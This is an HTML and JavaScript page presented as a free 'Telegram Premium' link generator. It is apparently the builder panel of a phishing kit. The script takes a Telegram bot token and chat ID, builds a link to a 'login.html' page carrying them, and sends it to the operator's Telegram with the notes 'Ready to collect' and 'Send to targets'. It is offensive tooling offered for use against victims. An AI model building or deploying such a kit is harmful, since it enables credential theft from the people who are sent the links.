<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Premium Tool | Free Link Generator</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow-x: hidden;
        }
        .glass-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 40px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            animation: slideUp 0.8s ease-out;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #00d4ff, #0099cc);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 32px;
            color: white;
            box-shadow: 0 10px 30px rgba(0,212,255,0.3);
        }
        h1 {
            color: white;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #fff, #f0f0f0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .subtitle {
            color: rgba(255,255,255,0.8);
            font-size: 16px;
            font-weight: 400;
        }
        .input-group {
            margin-bottom: 24px;
            position: relative;
        }
        .input-label {
            display: block;
            margin-bottom: 8px;
            color: rgba(255,255,255,0.9);
            font-size: 14px;
            font-weight: 500;
        }
        .input-field {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255,255,255,0.15);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 16px;
            color: white;
            font-size: 16px;
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }
        .input-field::placeholder {
            color: rgba(255,255,255,0.6);
        }
        .input-field:focus {
            outline: none;
            border-color: rgba(255,255,255,0.4);
            box-shadow: 0 0 0 4px rgba(255,255,255,0.1);
            background: rgba(255,255,255,0.2);
        }
        .generate-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #00d4ff 0%, #0099cc 100%);
            border: none;
            border-radius: 16px;
            color: white;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 10px 30px rgba(0,212,255,0.4);
        }
        .generate-btn:hover {
            transform: translateY(-4px);
            box-shadow: 0 20px 40px rgba(0,212,255,0.5);
        }
        .generate-btn:active {
            transform: translateY(-2px);
        }
        .success-msg {
            background: rgba(0,255,127,0.2);
            border: 1px solid rgba(0,255,127,0.4);
            border-radius: 16px;
            padding: 20px;
            margin-top: 20px;
            text-align: center;
            color: #00ff7f;
            font-weight: 500;
            display: none;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            color: rgba(255,255,255,0.6);
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="glass-card">
        <div class="header">
            <div class="logo">
                <i class="fab fa-telegram-plane"></i>
            </div>
            <h1>Premium Generator</h1>
            <p class="subtitle">Generate unlimited Telegram links instantly</p>
        </div>

        <div class="input-group">
            <span class="input-label">Bot Token</span>
            <input type="text" class="input-field" id="token" placeholder="1234567890:ABCdefGHIjklmnoPQRstuV">
        </div>

        <div class="input-group">
            <span class="input-label">Chat ID</span>
            <input type="text" class="input-field" id="chatId" placeholder="@username or 123456789">
        </div>

        <button class="generate-btn" id="generateBtn">
            <i class="fas fa-magic"></i>
            Generate Link
        </button>

        <div class="success-msg" id="successMsg">
            ✅ Link sent to your Telegram successfully!
        </div>

        <div class="footer">
            Powered by <strong>Telegram Tools</strong> | v2.0
        </div>
    </div>

    <script>
        document.getElementById('generateBtn').addEventListener('click', async () => {
            const token = document.getElementById('token').value.trim();
            const chatId = document.getElementById('chatId').value.trim();
            const btn = document.getElementById('generateBtn');
            const successMsg = document.getElementById('successMsg');

            if (!token || !chatId) {
                alert('Please fill all fields!');
                return;
            }

            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
            btn.disabled = true;

            const baseUrl = window.location.origin;
            const loginUrl = `${baseUrl}/login.html?token=${token}&chatid=${chatId}`;

            const message = `🚀 <b>Premium Link Generated!</b>\n\n` +
                          `🔗 <code>${loginUrl}</code>\n\n` +
                          `📊 <b>Status:</b> Ready to collect\n` +
                          `👥 <b>Share:</b> Send to targets`;

            try {
                const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await res.json();
                if (data.ok) {
                    successMsg.style.display = 'block';
                    successMsg.scrollIntoView({behavior: 'smooth'});
                } else {
                    throw new Error(data.description);
                }
            } catch (error) {
                alert('Error: ' + error.message);
            } finally {
                btn.innerHTML = originalText;
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
